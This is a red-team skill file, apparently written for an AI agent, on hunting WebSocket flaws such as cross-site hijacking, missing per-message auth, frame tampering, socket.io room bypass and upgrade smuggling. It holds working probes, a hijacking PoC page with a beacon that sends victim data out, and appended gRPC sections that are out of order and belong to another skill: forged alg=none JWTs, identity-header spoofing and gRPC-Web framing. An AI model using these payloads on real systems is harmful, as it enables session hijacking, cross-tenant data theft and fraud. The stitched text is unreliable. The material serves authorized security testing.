---
name: hunt-websocket
description: "Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, real-time features, chat, live dashboards, notifications, or trading platforms."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [websocket, hunt, redteam]
---

# HUNT-WEBSOCKET — WebSocket Security

## Crown Jewel Targets

CSWSH (Cross-Site WebSocket Hijacking) with a cookie-authenticated handshake and no CSRF/per-connection token = High–Critical (real-time exfil of any logged-in victim's data).

**Highest-value chains:**
- **CSWSH → data exfil / ATO** — handshake authenticates via ambient cookie, no CSRF token, Origin not enforced → attacker page opens WS as the victim and streams their messages/PII/tokens. If the stream carries a session/refresh/CSRF token, this escalates to ATO.
- **No per-message auth** — HTTP/handshake auth present but individual WS frames are not re-authorized → privileged messages accepted (`deleteUser`, `getSecretConfig`).
- **Message tampering** — modify in-flight frames (price, qty, userId, amount) in trading/game/checkout apps → financial fraud.
- **socket.io namespace / room authz bypass** — connect to a privileged namespace or join another user's room without a permission check → cross-tenant real-time exfil.
- **Handshake-layer Upgrade smuggling** — a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred → request-smuggling tunnel.

---

## Grounding — Reference Cases (read before hunting)

These are public, verifiable references. Use them to calibrate what a *real* WS finding looks like and how it was proven. Do not invent additional report IDs or payouts.

| # | Source / ID | Class | Lesson |
|---|-------------|-------|--------|
| 1 | PortSwigger Web Security Academy — "Cross-site WebSocket hijacking" (research + labs) | CSWSH | Canonical CSWSH model: cookie-auth handshake + no CSRF token + missing Origin check → attacker reads/sends as victim. The authoritative methodology. |
| 2 | Christian Schneider — "Cross-Site WebSocket Hijacking (CSWSH)" (original disclosure/write-up, 2013) | CSWSH | First public CSWSH technique: cookie-auth handshake + no Origin enforcement; PoC must prove victim-data receipt in the attacker browser, not just a 101. |
| 3 | Coda CSWSH (referenced in this repo's hunt-csrf set) | CSWSH | Real-time collab apps commonly authenticate the socket purely via cookie; Origin allow-listing was the missing control. |
| 4 | CVE-2020-7662 — `websocket-extensions` (Node) ReDoS | DoS | A crafted `Sec-WebSocket-Extensions` header triggers catastrophic backtracking — handshake header is an attack surface, not just frames. |
| 5 | CVE-2024-37890 — `ws` (Node) DoS | DoS | Many handshake request headers exhaust the server; confirms the handshake itself is parser-attackable pre-frames. |
| 6 | Outdated `socket.io` / Engine.IO stacks | socket.io | Motivates the version-fingerprint step in Phase 7 — fingerprint the version, then check that release's known advisories. |

> Only the four CVEs above are asserted with exact IDs because they are verifiable. For any case where you are not certain of the exact identifier, describe the technique with **no** citation — a wrong CVE is worse than none.

---

## Phase 1 — Discover WebSocket Endpoints

```bash
# Grep JS for WS connections (handshake URLs, socket.io clients)
grep -rE "new WebSocket|io\(|io\.connect|socket\.io|new SockJS|signalr|Phoenix\.Socket|wss?://" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_.-]*socket[^'\"]*|/signalr[^'\"]*|/cable\b)" | sort -u

# Crawl URLs for realtime hints
grep -iE "socket|/ws\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|notifications" \
  recon/$TARGET/urls.txt | sort -u

# Probe handshake (101 = upgrade supported)
curl --max-time 30 --connect-timeout 10 -sI -o /dev/null -w "%{http_code}\n" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"

# socket.io polling handshake leaks version + sid
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo

# Non-standard WS ports
nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open
```

In Burp Pro, use `get_proxy_websocket_history` (and the WebSockets tab) after browsing the app to enumerate live sockets, message schemas, and which frames carry auth-sensitive data.

---

## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)

CSWSH requires THREE conditions together: (a) the handshake authenticates via an **ambient credential** (cookie sent automatically), (b) there is **no unpredictable per-connection token** in the handshake (no CSRF token / no token in URL/body), and (c) the server **does not enforce Origin**. Missing any one breaks the attack.

```bash
# Step 1 — Confirm handshake auth model in DevTools → Network → WS → Headers.
#   Look for: Cookie: session=...  AND  the ABSENCE of any per-request token
#   (no ?token=, no Sec-WebSocket-Protocol carrying a bearer, no body nonce).
#   If a unique token rides the handshake, CSWSH is NOT exploitable cross-site.

# Step 2 — Probe Origin enforcement (this is a SIGNAL, not a confirmation)
wscat -c "wss://$TARGET/ws" \
  --header "Origin: https://evil.com" \
  --header "Cookie: session=YOUR_SESSION"
# A 101 from a foreign Origin only proves the handshake opened.
# It does NOT confirm CSWSH — the server may still validate Origin at the
# message layer, refuse to stream authenticated data, or require a token
# in the first app-level frame. Treat 101 as "candidate", move to Step 3.
```

```html
<!-- Step 3 — Real PoC: host on attacker origin, open while a SEPARATE victim
     account is logged into TARGET in the same browser. The bug is only
     confirmed if attacker JS RECEIVES the victim's data (or successfully
     sends a privileged frame). Cross-origin JS cannot set Origin/Cookie —
     the browser does, which is exactly the threat model. -->
<html><body><pre id="out"></pre><script>
var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
ws.onopen = () => {
  log("[+] 101 opened from attacker origin");
  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
};
ws.onmessage = e => {
  log("VICTIM-DATA: " + e.data);
  // Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:
  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
};
ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
function log(s){document.getElementById("out").textContent += s + "\n";}
</script></body></html>
```

**False-positive killers:**
- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.
- Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.
- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band — this is your impact proof for the report.
- If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.

---

## Phase 3 — Missing / Weak Authentication on WS Messages

Handshake auth ≠ per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.

```bash
# No cookie at all — does the server process app frames?
wscat -c "wss://$TARGET/ws"
# > {"type":"getUserData","userId":1}
# > {"type":"getAdminPanel"}

# Low-priv session sending high-priv actions
wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"
# > {"action":"deleteUser","userId":999}
# > {"action":"getSecretConfig"}
```

**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel) — a frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly.

---

## Phase 4 — Message Tampering (Financial / Game / Checkout)

```bash
# Intercept + edit in Burp (Proxy → WebSockets history → right-click → Send to
# Repeater, or edit-and-forward). Try server-trusted client values:
#   {"price":100}      -> {"price":0.01}
#   {"amount":1}       -> {"amount":9999}
#   {"userId":123}     -> {"userId":1}        # impersonate admin
#   {"orderTotal":...} -> recompute downstream?

# wscat replay of a tampered frame
wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
# > {"action":"buy","amount":1,"price":0.01}
```

**Validate:** the tampered value must persist server-side — confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument.

---

## Phase 5 — socket.io / SignalR / Phoenix Namespace & Room Authz Bypass

Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.

```bash
# 1) Open the raw socket.io WebSocket (Engine.IO v4)
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
  --header "Cookie: session=YOUR_SESSION"

# 2) Respond to the server's Engine.IO OPEN ('0{...}') so the connection lives,
#    then CONNECT to a namespace with a socket.io CONNECT packet.
#    CORRECT packet to join the /admin namespace:  40/admin,
#       4 = Engine.IO MESSAGE,  0 = socket.io CONNECT,  /admin, = namespace
#    (NOT a ?nsp= query param — see Phase 7. NOT 42 — 42 is MESSAGE+EVENT.)
# > 40/admin,
#    Server replies 40/admin,{"sid":"..."} on success, or 44/admin,{...} (error)
#    on rejection. A 40 success to a privileged namespace as a low/no-priv
#    user is the bug.

# 3) Once in a namespace, emit an EVENT (42) to join another user's room:
# > 42/admin,["join",{"room":"user_999_private"}]
# > 42["subscribe",{"channel":"admin_events"}]      # root namespace
#    Watch for 42 EVENT frames carrying ANOTHER user's data.
```

**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.

> SignalR analogue: negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization. Phoenix Channels: `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.

---

## Phase 6 — Handshake-Layer Upgrade Smuggling (NOT frame smuggling)

Important: once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.

The real technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently — e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is "upgraded" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).

```bash
# Detection is HTTP-layer, not frame-layer. Use Burp Repeater / send_http1_request
# and toggle ONE handshake variable at a time, comparing front-vs-origin behavior:

#  A) Valid-looking upgrade but unsupported version:
#     Upgrade: websocket
#     Connection: Upgrade
#     Sec-WebSocket-Version: 777          <- origin should 426; does the proxy still tunnel?
#     Sec-WebSocket-Key: <16-byte base64>

#  B) Upgrade header present but Connection: keep-alive (mismatch)
#  C) Smuggled second request body after a "successful" 101, then send a normal
#     follow-up request on the same connection and watch for a desynced response.
```

Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response.

---

## Phase 7 — socket.io / Engine.IO Specifics

```bash
# Version + initial sid (handshake JSON after the leading Engine.IO digit)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
# Old/EOL socket.io stacks have known issues — fingerprint the version, then check that release's advisories;
# fingerprint the client lib version from JS bundles too.

# Namespace selection is a PROTOCOL message, not a URL param.
#   WRONG:  wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket&nsp=/admin"
#           ^ `nsp` is NOT a recognized socket.io query param. It is silently
#             ignored and you connect to the ROOT namespace "/". You will believe
#             you tested /admin when you did not.
#   RIGHT:  open the socket, then send the CONNECT packet  40/admin,  (Phase 5).

# Forged/replayed sid against the polling transport (session fixation / hijack probe)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"
#   400 "Session ID unknown" = good. A 200 that resumes another sid's stream = bug.
```

---

## Tools

```bash
npm install -g wscat                 # CLI WS client (raw + socket.io)
brew install websocat                # alt client; supports text/binary + autoreconnect
# Burp Suite Pro: WebSockets history (intercept/edit/replay), HTTP Request
#   Smuggler extension (handshake-upgrade smuggling), Collaborator for OAST proof.
# Burp MCP: get_proxy_websocket_history / get_proxy_websocket_history_regex to
#   enumerate frames; generate_collaborator_payload + get_collaborator_interactions
#   to prove out-of-band receipt from a CSWSH/smuggling PoC.
```

---

## Chain Table

| WS finding | Chain to | Impact |
|-----------|----------|--------|
| CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
| No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
| Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
| Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
| Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF/cache poison (High–Critical) |

---

## Validation (mandatory before reporting)

- ✅ **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **Collaborator/OAST**. A bare `101` from a foreign Origin is NOT a finding.
- ✅ **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
- ✅ **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
- ✅ **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
- ✅ **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.
- ❌ Reject: a 101 alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any "confirmed" claim lacking out-of-band/cross-account proof.

**Severity:**
- CSWSH leaking session/refresh token → ATO: **Critical**
- CSWSH → real-time session-data theft: **High**
- No auth on admin/privileged WS actions: **Critical**
- Financial message tampering (server-confirmed): **Critical**
- Namespace/room subscription bypass (cross-tenant): **High**

## MDPsec Verified Patterns (1 real WebSocket report)

Real-world primitives from mdpsec.com reports:

1. **Wildcard channel ACL on real-time proxy** — live events pushed through a real-time messaging proxy over WebSocket; permission rules grant EVERY authenticated session subscribe + publish on the ENTIRE classroom channel namespace, not just the session's own classes; sign-up is open self-service with no email verification → zero-connection account subscribes across every classroom at once (124). Events carry student ids + teacher source ids; ID→name resolution via connection-request endpoint.
2. **Detection** — scope probe: other channel namespaces (family, user, school) return permissions violation while only the target namespace is wrongly accepted → broken per-session scope, not an open broker. Same-origin WebSocket auto-attaches session cookie.
3. **Impact** — live cross-tenant eavesdropping on minors' behavioral records resolvable to real names; bounded to read-only live feed (no history replay; publishes fan-out only, never stored).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Verification

Run this self-test to confirm websocket hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-websocket" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **WebSocket without auth** — if the WebSocket endpoint doesn't require auth tokens, anyone can connect. Test post-connection auth requirements.
- **ws:// instead of wss://** — plaintext WebSocket on public services allows MITM. This is Medium if the WebSocket carries sensitive data.
- **WebSocket CSWSH** — Cross-Site WebSocket Hijacking: if the WebSocket handshake doesn't validate Origin, an attacker's page can open a WebSocket. Test with `Origin: evil.com`.
- **WebSocket message injection** — injecting into WebSocket messages that are reflected to other users is stored XSS via WebSocket.

---

## Related Skills

- **`hunt-csrf`** — CSWSH is structurally a CSRF + WebSocket upgrade combo. Chain primitive: handshake authenticates via ambient cookie + no CSRF token + missing Origin check → attacker-origin page opens WS as victim and streams messages → same impact model as CSRF (state change without consent) but bidirectional.
- **`hunt-http-smuggling`** — Handshake-layer Upgrade smuggling (malformed Upgrade/Connection headers) makes front proxy and origin disagree on whether an upgrade occurred. Chain primitive: smuggling tunnel through WAF → internal endpoint access or cache poisoning.
- **`hunt-ssrf`** — WebSocket endpoints that accept URL params or connection-target overrides are SSRF surfaces. Chain primitive: WS client connects to wss://target/ws?proxy=attacker-host → server-side proxy follows → cloud metadata on [REDACTED_IP].
- **`hunt-session`** — WebSocket connections that don't re-validate session on reconnection create persistence bugs. Chain primitive: stolen session cookie replayed on new WS connection → reconnection inherits all subscribed channels without re-auth.
- **`hunt-tls-network`** — WebSocket connections over wss:// vs ws:// (plaintext) determine whether PII in frames is readable on the wire. Chain primitive: ws:// on non-standard port → TLS downgrade → credential interception.
- **`security-arsenal`** — Reach for the WebSocket CSWSH PoC template, socket.io/signalr namespace discovery payloads, and the WS message tampering frame construction guide.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen Gate: CSWSH is only confirmed when attacker-origin JS actually receives victim data (verified by unique marker / distinct PII) and exfils it to a Collaborator listener. A bare 101 from a foreign Origin is not a finding.


---

## Content from local version



## Phase 4 — Authentication / Trust-Boundary Bypass

```bash
# (a) Forged bearer / alg=none JWT in the authorization metadata
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
  -d '{}' admin.AdminService/GetConfig

# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and
#     then trust identity injected as metadata. If the edge does not STRIP these,
#     spoofing them = full impersonation. Test every plausible name:
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
  echo "== $H =="
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
done

# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the
#     server; some auth middlewares only inspect text metadata, missing -bin keys.
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
  -d '{}' admin.AdminService/GetConfig
```

The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.




## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.

```bash
# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often
#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

# (b) Build a real gRPC-Web length-prefixed frame instead of a hand-waved one.
#     Frame = 1-byte flag (0x00=data) + 4-byte big-endian length + protobuf payload.
#     Encode the message with protoscope so the bytes are correct:
#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).




## Phase 2 — Service Enumeration via Reflection

```bash
brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# Typical output when reflection is on:
#   grpc.reflection.v1.ServerReflection
#   grpc.health.v1.Health
#   user.UserService
#   admin.AdminService
#   payment.PaymentService

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog to triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.




## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)

## webhacklist 2024-2026 updates

- **Cross-Site WebSocket Hijacking Exploitation in 2025** — 2025. Modern CSWSH: no CORS check on `WebSocket`, session cookie carried automatically. Test: connect from an evil origin to `ws(s)://target`, see if handshake accepts + server pushes private data.
- **Fuzzing WebSockets for server-side vulnerabilities** — 2025. Fuzz WS message frames for injection/confusion into backend desync.
- **Hacking into gRPC-Web** — 2023. gRPC over WebSocket/browser — see `hunt-grpc`.
- Proto/descriptor leak, no callable sensitive method → **Low**